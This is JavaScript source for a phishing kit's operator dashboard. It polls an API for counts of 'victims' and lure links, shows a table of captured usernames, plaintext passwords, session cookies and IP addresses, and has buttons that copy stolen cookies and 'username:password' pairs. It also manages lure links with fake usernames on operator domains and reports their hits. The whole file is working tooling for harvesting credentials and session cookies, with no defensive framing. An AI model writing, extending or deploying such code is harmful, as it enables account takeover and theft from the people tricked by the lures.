// dashboard.js

async function loadStats() {
  try {
    const d = await fetch('/api/stats').then(r => r.json());
    document.getElementById('s-hits').textContent    = d.totalVictims;
    document.getElementById('s-links').textContent   = d.totalLinks;
    document.getElementById('s-today').textContent   = d.todayVictims;
    const conv = d.totalLinks > 0 ? Math.round((d.totalVictims / d.totalLinks) * 100) : 0;
    document.getElementById('s-conv').textContent    = conv + '%';
    renderVictims(d.recentVictims || []);
  } catch(e) { console.error(e); }
}

function renderVictims(list) {
  const el = document.getElementById('victims-wrap');
  if (!list.length) {
    el.innerHTML = `<div class="empty"><div class="empty-icon">🎣</div>
      <div class="empty-title">No captures yet</div>
      <div class="empty-desc">Links are live — waiting for fish</div></div>`;
    return;
  }
  el.innerHTML = `<div class="tbl-wrap"><table>
    <thead><tr>
      <th>Username</th><th>Password</th><th>Cookie</th>
      <th>IP</th><th>Link</th><th>Time</th><th></th>
    </tr></thead>
    <tbody>${list.map(v => `<tr>
      <td><strong>${v.username||'—'}</strong></td>
      <td class="td-mono">${v.password||'—'}</td>
      <td class="td-mono" title="${v.cookie||''}">${maskCookie(v.cookie)}</td>
      <td class="td-mono">${v.ip||'—'}</td>
      <td><span class="badge badge-purple">${v.link_id}</span></td>
      <td class="td-mono">${ago(v.timestamp)}</td>
      <td style="display:flex;gap:5px">
        ${v.cookie?`<button class="btn btn-sm btn-secondary" onclick="copy('${v.cookie.replace(/'/g,"\\'")}','🍪 Copied!')">🍪</button>`:''}
        <button class="btn btn-sm btn-secondary" onclick="copy('${(v.username||'')+':' +(v.password||'')}','Creds copied!')">📋</button>
      </td>
    </tr>`).join('')}</tbody>
  </table></div>`;
}

async function loadLinks() {
  try {
    const links = await fetch('/api/links').then(r => r.json());
    const el = document.getElementById('links-wrap');
    if (!links.length) {
      el.innerHTML = `<div class="empty"><div class="empty-icon">🔗</div>
        <div class="empty-title">No links yet</div>
        <div class="empty-desc">Head to Link Generator to create one</div></div>`;
      return;
    }
    el.innerHTML = `<div class="tbl-wrap"><table>
      <thead><tr>
        <th>Fake User</th><th>Domain / Link</th><th>Status</th>
        <th>Hits</th><th>Created</th><th>Actions</th>
      </tr></thead>
      <tbody>${links.map(l => {
        const scls = {Online:'sdot-online',Offline:'sdot-offline','In Studio':'sdot-studio'}[l.status]||'sdot-offline';
        const full = `${l.domain}/r/${l.id}`;
        return `<tr>
          <td><strong>${l.fake_username}</strong><br><small style="color:var(--text2)">${l.display_name}</small></td>
          <td class="td-mono" style="max-width:260px">${full}</td>
          <td><div style="display:flex;align-items:center;gap:6px"><div class="sdot ${scls}"></div>${l.status}</div></td>
          <td><span class="badge ${l.hits>0?'badge-green':'badge-yellow'}">${l.hits} hits</span></td>
          <td class="td-mono">${ago(l.created_at)}</td>
          <td style="display:flex;gap:5px">
            <button class="btn btn-sm btn-secondary" onclick="copy('${full}','🔗 Copied!')">📋</button>
            <button class="btn btn-sm btn-danger"    onclick="delLink('${l.id}')">🗑</button>
          </td>
        </tr>`;
      }).join('')}</tbody>
    </table></div>`;
  } catch(e) { console.error(e); }
}

async function delLink(id) {
  if (!confirm('Delete this link?')) return;
  await fetch(`/api/links/${id}`, { method:'DELETE' });
  toast('Link deleted', 'success');
  loadStats(); loadLinks();
}

document.addEventListener('DOMContentLoaded', () => {
  loadStats();
  loadLinks();
  setInterval(() => { loadStats(); loadLinks(); }, 30000);
});
